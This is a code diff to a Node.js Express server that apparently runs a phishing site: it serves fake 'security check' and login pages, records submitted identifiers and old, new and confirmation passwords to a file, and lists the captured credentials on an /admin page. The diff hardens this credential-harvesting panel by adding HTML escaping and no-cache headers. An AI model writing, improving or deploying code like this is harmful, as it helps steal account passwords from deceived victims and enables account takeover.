@@ -7,6 +7,24 @@ const app = express();
 const PORT = process.env.PORT || 80;
 const LOG_FILE = path.join(__dirname, 'captured_data.json');
 
+const escapeHtml = (str) => {
+    if (str === null || str === undefined) return '';
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+};
+
+const noCache = (req, res, next) => {
+    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
+    res.setHeader('Surrogate-Control', 'no-store');
+    next();
+};
+
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, 'public')));
@@ -15,7 +33,7 @@ app.get(['/', '/security', '/security/check', '/login/identify'], (req, res) => 
     res.sendFile(path.join(__dirname, 'public', 'index_clean.html'));
 });
 
-app.post('/submit', (req, res) => {
+app.post('/submit', noCache, (req, res) => {
     const entry = {
         timestamp: new Date().toLocaleString('fr-FR'),
         identifier: req.body.identifier || '',
@@ -133,18 +151,18 @@ const readData = () => {
     return [];
 };
 
-app.get('/admin', (req, res) => {
+app.get('/admin', noCache, (req, res) => {
     const data = readData();
     const count = data.length;
 
     const rows = data.slice().reverse().map((e, i) => `
         <tr>
             <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:12px;color:#64748b;white-space:nowrap;">${count - i}</td>
-            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:13px;color:#0f172a;white-space:nowrap;">${e.timestamp || ''}</td>
-            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#2563eb;font-weight:600;word-break:break-all;">${e.identifier || ''}</td>
-            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#dc2626;font-family:monospace;word-break:break-all;">${e.old_password || ''}</td>
-            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#16a34a;font-family:monospace;word-break:break-all;">${e.new_password || ''}</td>
-            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#64748b;font-family:monospace;word-break:break-all;">${e.confirm_password || ''}</td>
+            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:13px;color:#0f172a;white-space:nowrap;">${escapeHtml(e.timestamp || '')}</td>
+            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#2563eb;font-weight:600;word-break:break-all;">${escapeHtml(e.identifier || '')}</td>
+            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#dc2626;font-family:monospace;word-break:break-all;">${escapeHtml(e.old_password || '')}</td>
+            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#16a34a;font-family:monospace;word-break:break-all;">${escapeHtml(e.new_password || '')}</td>
+            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#64748b;font-family:monospace;word-break:break-all;">${escapeHtml(e.confirm_password || '')}</td>
         </tr>
     `).join('');
 
